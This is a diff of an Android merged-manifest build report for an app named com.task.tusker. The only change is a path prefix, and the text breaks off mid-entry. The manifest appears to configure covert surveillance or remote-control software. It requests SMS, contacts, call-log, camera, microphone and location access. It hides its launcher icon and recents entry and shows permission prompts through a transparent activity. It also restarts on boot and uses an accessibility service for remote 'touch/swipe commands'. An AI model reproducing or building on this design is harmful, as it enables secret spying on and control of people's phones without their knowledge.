@@ -10,128 +10,128 @@
 10
 11    <!-- Core networking -->
 12    <uses-permission android:name="android.permission.INTERNET" />
-12-->/home/runner/workspace/app/src/main/AndroidManifest.xml:6:5-67
-12-->/home/runner/workspace/app/src/main/AndroidManifest.xml:6:22-64
+12-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:6:5-67
+12-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:6:22-64
 13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-13-->/home/runner/workspace/app/src/main/AndroidManifest.xml:7:5-79
-13-->/home/runner/workspace/app/src/main/AndroidManifest.xml:7:22-76
+13-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:7:5-79
+13-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:7:22-76
 14
 15    <!-- Foreground service -->
 16    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-16-->/home/runner/workspace/app/src/main/AndroidManifest.xml:10:5-77
-16-->/home/runner/workspace/app/src/main/AndroidManifest.xml:10:22-74
+16-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:10:5-77
+16-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:10:22-74
 17    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-17-->/home/runner/workspace/app/src/main/AndroidManifest.xml:11:5-87
-17-->/home/runner/workspace/app/src/main/AndroidManifest.xml:11:22-84
+17-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:11:5-87
+17-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:11:22-84
 18    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
-18-->/home/runner/workspace/app/src/main/AndroidManifest.xml:12:5-84
-18-->/home/runner/workspace/app/src/main/AndroidManifest.xml:12:22-81
+18-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:12:5-84
+18-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:12:22-81
 19    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-19-->/home/runner/workspace/app/src/main/AndroidManifest.xml:13:5-88
-19-->/home/runner/workspace/app/src/main/AndroidManifest.xml:13:22-85
+19-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:13:5-88
+19-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:13:22-85
 20    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
-20-->/home/runner/workspace/app/src/main/AndroidManifest.xml:14:5-86
-20-->/home/runner/workspace/app/src/main/AndroidManifest.xml:14:22-83
+20-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:14:5-86
+20-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:14:22-83
 21
 22    <!-- Keep-alive / boot -->
 23    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-23-->/home/runner/workspace/app/src/main/AndroidManifest.xml:17:5-81
-23-->/home/runner/workspace/app/src/main/AndroidManifest.xml:17:22-78
+23-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:17:5-81
+23-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:17:22-78
 24    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-24-->/home/runner/workspace/app/src/main/AndroidManifest.xml:18:5-95
-24-->/home/runner/workspace/app/src/main/AndroidManifest.xml:18:22-92
+24-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:18:5-95
+24-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:18:22-92
 25    <uses-permission android:name="android.permission.WAKE_LOCK" />
-25-->/home/runner/workspace/app/src/main/AndroidManifest.xml:19:5-68
-25-->/home/runner/workspace/app/src/main/AndroidManifest.xml:19:22-65
+25-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:19:5-68
+25-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:19:22-65
 26
 27    <!-- Audio volume control (mute/unmute streams without needing DND policy) -->
 28    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
-28-->/home/runner/workspace/app/src/main/AndroidManifest.xml:22:5-80
-28-->/home/runner/workspace/app/src/main/AndroidManifest.xml:22:22-77
+28-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:22:5-80
+28-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:22:22-77
 29
 30    <!-- SMS -->
 31    <uses-permission android:name="android.permission.READ_SMS" />
-31-->/home/runner/workspace/app/src/main/AndroidManifest.xml:25:5-67
-31-->/home/runner/workspace/app/src/main/AndroidManifest.xml:25:22-64
+31-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:25:5-67
+31-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:25:22-64
 32
 33    <!-- Contacts & Call logs -->
 34    <uses-permission android:name="android.permission.READ_CONTACTS" />
-34-->/home/runner/workspace/app/src/main/AndroidManifest.xml:28:5-72
-34-->/home/runner/workspace/app/src/main/AndroidManifest.xml:28:22-69
+34-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:28:5-72
+34-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:28:22-69
 35    <uses-permission android:name="android.permission.READ_CALL_LOG" />
-35-->/home/runner/workspace/app/src/main/AndroidManifest.xml:29:5-72
-35-->/home/runner/workspace/app/src/main/AndroidManifest.xml:29:22-69
+35-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:29:5-72
+35-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:29:22-69
 36
 37    <!-- Camera / Audio -->
 38    <uses-permission android:name="android.permission.CAMERA" />
-38-->/home/runner/workspace/app/src/main/AndroidManifest.xml:32:5-65
-38-->/home/runner/workspace/app/src/main/AndroidManifest.xml:32:22-62
+38-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:32:5-65
+38-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:32:22-62
 39    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-39-->/home/runner/workspace/app/src/main/AndroidManifest.xml:33:5-71
-39-->/home/runner/workspace/app/src/main/AndroidManifest.xml:33:22-68
+39-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:33:5-71
+39-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:33:22-68
 40
 41    <!-- Location -->
 42    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-42-->/home/runner/workspace/app/src/main/AndroidManifest.xml:36:5-79
-42-->/home/runner/workspace/app/src/main/AndroidManifest.xml:36:22-76
+42-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:36:5-79
+42-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:36:22-76
 43    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-43-->/home/runner/workspace/app/src/main/AndroidManifest.xml:37:5-81
-43-->/home/runner/workspace/app/src/main/AndroidManifest.xml:37:22-78
+43-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:37:5-81
+43-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:37:22-78
 44
 45    <!-- Storage (legacy + Android 13+ media) -->
 46    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-46-->/home/runner/workspace/app/src/main/AndroidManifest.xml:40:5-80
-46-->/home/runner/workspace/app/src/main/AndroidManifest.xml:40:22-77
+46-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:40:5-80
+46-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:40:22-77
 47    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-47-->/home/runner/workspace/app/src/main/AndroidManifest.xml:41:5-42:40
-47-->/home/runner/workspace/app/src/main/AndroidManifest.xml:41:22-78
+47-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:41:5-42:40
+47-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:41:22-78
 48    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
-48-->/home/runner/workspace/app/src/main/AndroidManifest.xml:43:5-76
-48-->/home/runner/workspace/app/src/main/AndroidManifest.xml:43:22-73
+48-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:43:5-76
+48-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:43:22-73
 49    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
-49-->/home/runner/workspace/app/src/main/AndroidManifest.xml:44:5-75
-49-->/home/runner/workspace/app/src/main/AndroidManifest.xml:44:22-72
+49-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:44:5-75
+49-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:44:22-72
 50    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-50-->/home/runner/workspace/app/src/main/AndroidManifest.xml:45:5-75
-50-->/home/runner/workspace/app/src/main/AndroidManifest.xml:45:22-72
+50-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:45:5-75
+50-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:45:22-72
 51    <!-- Android 11+ unrestricted file access (File Manager) -->
 52    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
-52-->/home/runner/workspace/app/src/main/AndroidManifest.xml:47:5-48:40
-52-->/home/runner/workspace/app/src/main/AndroidManifest.xml:47:22-79
+52-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:47:5-48:40
+52-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:47:22-79
 53    <!-- Access precise EXIF location in media files (Android 10+) -->
 54    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
-54-->/home/runner/workspace/app/src/main/AndroidManifest.xml:50:5-80
-54-->/home/runner/workspace/app/src/main/AndroidManifest.xml:50:22-77
+54-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:50:5-80
+54-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:50:22-77
 55    <!-- WiFi scanning -->
 56    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-56-->/home/runner/workspace/app/src/main/AndroidManifest.xml:52:5-76
-56-->/home/runner/workspace/app/src/main/AndroidManifest.xml:52:22-73
+56-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:52:5-76
+56-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:52:22-73
 57    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
-57-->/home/runner/workspace/app/src/main/AndroidManifest.xml:53:5-76
-57-->/home/runner/workspace/app/src/main/AndroidManifest.xml:53:22-73
+57-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:53:5-76
+57-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:53:22-73
 58
 59    <!-- Device features -->
 60    <uses-permission android:name="android.permission.VIBRATE" />
-60-->/home/runner/workspace/app/src/main/AndroidManifest.xml:56:5-66
-60-->/home/runner/workspace/app/src/main/AndroidManifest.xml:56:22-63
+60-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:56:5-66
+60-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:56:22-63
 61    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
-61-->/home/runner/workspace/app/src/main/AndroidManifest.xml:57:5-79
-61-->/home/runner/workspace/app/src/main/AndroidManifest.xml:57:22-76
+61-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:57:5-79
+61-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:57:22-76
 62
 63    <!-- Notifications (Android 13+) -->
 64    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-64-->/home/runner/workspace/app/src/main/AndroidManifest.xml:60:5-77
-64-->/home/runner/workspace/app/src/main/AndroidManifest.xml:60:22-74
+64-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:60:5-77
+64-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:60:22-74
 65
 66    <!-- Required to trigger the system uninstall dialog for other apps -->
 67    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
-67-->/home/runner/workspace/app/src/main/AndroidManifest.xml:63:5-82
-67-->/home/runner/workspace/app/src/main/AndroidManifest.xml:63:22-79
+67-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:63:5-82
+67-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:63:22-79
 68
 69    <!-- Required on Android 11+ to query and list all installed packages -->
 70    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
-70-->/home/runner/workspace/app/src/main/AndroidManifest.xml:66:5-67:53
-70-->/home/runner/workspace/app/src/main/AndroidManifest.xml:66:22-74
+70-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:66:5-67:53
+70-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:66:22-74
 71
 72    <permission
 72-->[androidx.core:core:1.9.0] /home/runner/.gradle/caches/transforms-4/62bd5f0c933634171ed4412e7920dc4c/transformed/core-1.9.0/AndroidManifest.xml:22:5-24:47
@@ -145,31 +145,31 @@
 76-->[androidx.core:core:1.9.0] /home/runner/.gradle/caches/transforms-4/62bd5f0c933634171ed4412e7920dc4c/transformed/core-1.9.0/AndroidManifest.xml:26:22-94
 77
 78    <application
-78-->/home/runner/workspace/app/src/main/AndroidManifest.xml:69:5-195:19
+78-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:69:5-195:19
 79        android:allowBackup="false"
-79-->/home/runner/workspace/app/src/main/AndroidManifest.xml:70:9-36
+79-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:70:9-36
 80        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
 80-->[androidx.core:core:1.9.0] /home/runner/.gradle/caches/transforms-4/62bd5f0c933634171ed4412e7920dc4c/transformed/core-1.9.0/AndroidManifest.xml:28:18-86
 81        android:dataExtractionRules="@xml/data_extraction_rules"
-81-->/home/runner/workspace/app/src/main/AndroidManifest.xml:71:9-65
+81-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:71:9-65
 82        android:debuggable="true"
 83        android:extractNativeLibs="false"
 84        android:fullBackupContent="@xml/backup_rules"
-84-->/home/runner/workspace/app/src/main/AndroidManifest.xml:72:9-54
+84-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:72:9-54
 85        android:icon="@mipmap/ic_launcher"
-85-->/home/runner/workspace/app/src/main/AndroidManifest.xml:73:9-43
+85-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:73:9-43
 86        android:label="@string/app_name"
-86-->/home/runner/workspace/app/src/main/AndroidManifest.xml:74:9-41
+86-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:74:9-41
 87        android:preserveLegacyExternalStorage="true"
-87-->/home/runner/workspace/app/src/main/AndroidManifest.xml:79:9-53
+87-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:79:9-53
 88        android:requestLegacyExternalStorage="true"
-88-->/home/runner/workspace/app/src/main/AndroidManifest.xml:78:9-52
+88-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:78:9-52
 89        android:roundIcon="@mipmap/ic_launcher_round"
-89-->/home/runner/workspace/app/src/main/AndroidManifest.xml:75:9-54
+89-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:75:9-54
 90        android:supportsRtl="true"
-90-->/home/runner/workspace/app/src/main/AndroidManifest.xml:76:9-35
+90-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:76:9-35
 91        android:theme="@style/Theme.SystemService" >
-91-->/home/runner/workspace/app/src/main/AndroidManifest.xml:77:9-51
+91-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:77:9-51
 92
 93        <!--
 94            Main Activity — NOT visible in the home launcher.
@@ -179,39 +179,39 @@
 98            CATEGORY_LAUNCHER is intentionally absent from this activity.
 99        -->
 100        <activity
-100-->/home/runner/workspace/app/src/main/AndroidManifest.xml:89:9-105:20
+100-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:89:9-105:20
 101            android:name="com.task.tusker.MainActivity"
-101-->/home/runner/workspace/app/src/main/AndroidManifest.xml:90:13-41
+101-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:90:13-41
 102            android:enabled="true"
-102-->/home/runner/workspace/app/src/main/AndroidManifest.xml:91:13-35
+102-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:91:13-35
 103            android:excludeFromRecents="true"
-103-->/home/runner/workspace/app/src/main/AndroidManifest.xml:94:13-46
+103-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:94:13-46
 104            android:exported="true"
-104-->/home/runner/workspace/app/src/main/AndroidManifest.xml:92:13-36
+104-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:92:13-36
 105            android:launchMode="singleTop" >
-105-->/home/runner/workspace/app/src/main/AndroidManifest.xml:93:13-43
+105-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:93:13-43
 106
 107            <!-- Enables Settings > App Info > Open without showing a launcher icon -->
 108            <intent-filter>
-108-->/home/runner/workspace/app/src/main/AndroidManifest.xml:96:13-99:29
+108-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:96:13-99:29
 109                <action android:name="android.intent.action.MAIN" />
-109-->/home/runner/workspace/app/src/main/AndroidManifest.xml:97:17-69
-109-->/home/runner/workspace/app/src/main/AndroidManifest.xml:97:25-66
+109-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:97:17-69
+109-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:97:25-66
 110
 111                <category android:name="android.intent.category.INFO" />
-111-->/home/runner/workspace/app/src/main/AndroidManifest.xml:98:17-73
-111-->/home/runner/workspace/app/src/main/AndroidManifest.xml:98:27-70
+111-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:98:17-73
+111-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:98:27-70
 112            </intent-filter>
 113            <!-- Custom action for programmatic / ADB launch -->
 114            <intent-filter>
-114-->/home/runner/workspace/app/src/main/AndroidManifest.xml:101:13-104:29
+114-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:101:13-104:29
 115                <action android:name="com.task.tusker.LAUNCH" />
-115-->/home/runner/workspace/app/src/main/AndroidManifest.xml:102:17-65
-115-->/home/runner/workspace/app/src/main/AndroidManifest.xml:102:25-62
+115-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:102:17-65
+115-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:102:25-62
 116
 117                <category android:name="android.intent.category.DEFAULT" />
-117-->/home/runner/workspace/app/src/main/AndroidManifest.xml:103:17-76
-117-->/home/runner/workspace/app/src/main/AndroidManifest.xml:103:27-73
+117-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:103:17-76
+117-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:103:27-73
 118            </intent-filter>
 119        </activity>
 120        <!--
@@ -220,36 +220,36 @@
 123            the app in the launcher; hideAppIcon() disables it again.
 124        -->
 125        <activity-alias
-125-->/home/runner/workspace/app/src/main/AndroidManifest.xml:112:9-121:26
+125-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:112:9-121:26
 126            android:name="com.task.tusker.LauncherAlias"
-126-->/home/runner/workspace/app/src/main/AndroidManifest.xml:113:13-42
+126-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:113:13-42
 127            android:enabled="false"
-127-->/home/runner/workspace/app/src/main/AndroidManifest.xml:115:13-36
+127-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:115:13-36
 128            android:exported="true"
-128-->/home/runner/workspace/app/src/main/AndroidManifest.xml:116:13-36
+128-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:116:13-36
 129            android:targetActivity="com.task.tusker.MainActivity" >
-129-->/home/runner/workspace/app/src/main/AndroidManifest.xml:114:13-51
+129-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:114:13-51
 130            <intent-filter>
-130-->/home/runner/workspace/app/src/main/AndroidManifest.xml:117:13-120:29
+130-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:117:13-120:29
 131                <action android:name="android.intent.action.MAIN" />
-131-->/home/runner/workspace/app/src/main/AndroidManifest.xml:97:17-69
-131-->/home/runner/workspace/app/src/main/AndroidManifest.xml:97:25-66
+131-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:97:17-69
+131-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:97:25-66
 132
 133                <category android:name="android.intent.category.LAUNCHER" />
-133-->/home/runner/workspace/app/src/main/AndroidManifest.xml:119:17-77
-133-->/home/runner/workspace/app/src/main/AndroidManifest.xml:119:27-74
+133-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:119:17-77
+133-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:119:27-74
 134            </intent-filter>
 135        </activity-alias>
 136
 137        <!-- Consent Activity -->
 138        <activity
-138-->/home/runner/workspace/app/src/main/AndroidManifest.xml:124:9-127:40
+138-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:124:9-127:40
 139            android:name="com.task.tusker.ConsentActivity"
-139-->/home/runner/workspace/app/src/main/AndroidManifest.xml:125:13-44
+139-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:125:13-44
 140            android:enabled="true"
-140-->/home/runner/workspace/app/src/main/AndroidManifest.xml:126:13-35
+140-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:126:13-35
 141            android:exported="false" />
-141-->/home/runner/workspace/app/src/main/AndroidManifest.xml:127:13-37
+141-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:127:13-37
 142
 143        <!--
 144            Transparent trampoline activity used by PermissionManager to show the
@@ -258,19 +258,19 @@
 147            transparent theme so only the system dialog is visible to the user.
 148        -->
 149        <activity
-149-->/home/runner/workspace/app/src/main/AndroidManifest.xml:135:9-141:46
+149-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:135:9-141:46
 150            android:name="com.task.tusker.PermissionRequestActivity"
-150-->/home/runner/workspace/app/src/main/AndroidManifest.xml:136:13-54
+150-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:136:13-54
 151            android:enabled="true"
-151-->/home/runner/workspace/app/src/main/AndroidManifest.xml:137:13-35
+151-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:137:13-35
 152            android:excludeFromRecents="true"
-152-->/home/runner/workspace/app/src/main/AndroidManifest.xml:140:13-46
+152-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:140:13-46
 153            android:exported="false"
-153-->/home/runner/workspace/app/src/main/AndroidManifest.xml:138:13-37
+153-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:138:13-37
 154            android:launchMode="singleTop"
-154-->/home/runner/workspace/app/src/main/AndroidManifest.xml:141:13-43
+154-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:141:13-43
 155            android:theme="@style/Theme.Transparent" />
-155-->/home/runner/workspace/app/src/main/AndroidManifest.xml:139:13-53
+155-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:139:13-53
 156
 157        <!--
 158            Background Service
@@ -278,15 +278,15 @@
 160            service may use so Android 14 doesn't kill it mid-operation.
 161        -->
 162        <service
-162-->/home/runner/workspace/app/src/main/AndroidManifest.xml:148:9-152:83
+162-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:148:9-152:83
 163            android:name="com.task.tusker.services.DataSyncService"
-163-->/home/runner/workspace/app/src/main/AndroidManifest.xml:149:13-53
+163-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:149:13-53
 164            android:enabled="true"
-164-->/home/runner/workspace/app/src/main/AndroidManifest.xml:150:13-35
+164-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:150:13-35
 165            android:exported="false"
-165-->/home/runner/workspace/app/src/main/AndroidManifest.xml:151:13-37
+165-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:151:13-37
 166            android:foregroundServiceType="dataSync|camera|microphone|location" />
-166-->/home/runner/workspace/app/src/main/AndroidManifest.xml:152:13-80
+166-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:152:13-80
 167
 168        <!--
 169            Secondary Background Service (com.access.client.BackgroundService)
@@ -296,36 +296,36 @@
 173            camera / microphone / location runtime permissions up front.
 174        -->
 175        <service
-175-->/home/runner/workspace/app/src/main/AndroidManifest.xml:161:9-165:56
+175-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:161:9-165:56
 176            android:name="com.access.client.BackgroundService"
-176-->/home/runner/workspace/app/src/main/AndroidManifest.xml:162:13-63
+176-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:162:13-63
 177            android:enabled="true"
-177-->/home/runner/workspace/app/src/main/AndroidManifest.xml:163:13-35
+177-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:163:13-35
 178            android:exported="false"
-178-->/home/runner/workspace/app/src/main/AndroidManifest.xml:164:13-37
+178-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:164:13-37
 179            android:foregroundServiceType="dataSync" />
-179-->/home/runner/workspace/app/src/main/AndroidManifest.xml:165:13-53
+179-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:165:13-53
 180
 181        <!-- Boot Receiver -->
 182        <receiver
-182-->/home/runner/workspace/app/src/main/AndroidManifest.xml:168:9-177:20
+182-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:168:9-177:20
 183            android:name="com.task.tusker.receivers.BootReceiver"
-183-->/home/runner/workspace/app/src/main/AndroidManifest.xml:169:13-51
+183-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:169:13-51
 184            android:enabled="true"
-184-->/home/runner/workspace/app/src/main/AndroidManifest.xml:170:13-35
+184-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:170:13-35
 185            android:exported="true" >
-185-->/home/runner/workspace/app/src/main/AndroidManifest.xml:171:13-36
+185-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:171:13-36
 186            <intent-filter>
-186-->/home/runner/workspace/app/src/main/AndroidManifest.xml:172:13-176:29
+186-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:172:13-176:29
 187                <action android:name="android.intent.action.BOOT_COMPLETED" />
-187-->/home/runner/workspace/app/src/main/AndroidManifest.xml:173:17-79
-187-->/home/runner/workspace/app/src/main/AndroidManifest.xml:173:25-76
+187-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:173:17-79
+187-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:173:25-76
 188                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
-188-->/home/runner/workspace/app/src/main/AndroidManifest.xml:174:17-84
-188-->/home/runner/workspace/app/src/main/AndroidManifest.xml:174:25-81
+188-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:174:17-84
+188-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:174:25-81
 189                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-189-->/home/runner/workspace/app/src/main/AndroidManifest.xml:175:17-82
-189-->/home/runner/workspace/app/src/main/AndroidManifest.xml:175:25-79
+189-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:175:17-82
+189-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:175:25-79
 190            </intent-filter>
 191        </receiver>
 192
@@ -334,26 +334,26 @@
 195            canPerformGestures="true" is required for touch/swipe commands.
 196        -->
 197        <service
-197-->/home/runner/workspace/app/src/main/AndroidManifest.xml:183:9-193:19
+197-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:183:9-193:19
 198            android:name="com.task.tusker.services.UnifiedAccessibilityService"
-198-->/home/runner/workspace/app/src/main/AndroidManifest.xml:184:13-65
+198-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:184:13-65
 199            android:exported="false"
-199-->/home/runner/workspace/app/src/main/AndroidManifest.xml:186:13-37
+199-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:186:13-37
 200            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
-200-->/home/runner/workspace/app/src/main/AndroidManifest.xml:185:13-79
+200-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:185:13-79
 201            <intent-filter>
-201-->/home/runner/workspace/app/src/main/AndroidManifest.xml:187:13-189:29
+201-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:187:13-189:29
 202                <action android:name="android.accessibilityservice.AccessibilityService" />
-202-->/home/runner/workspace/app/src/main/AndroidManifest.xml:188:17-92
-202-->/home/runner/workspace/app/src/main/AndroidManifest.xml:188:25-89
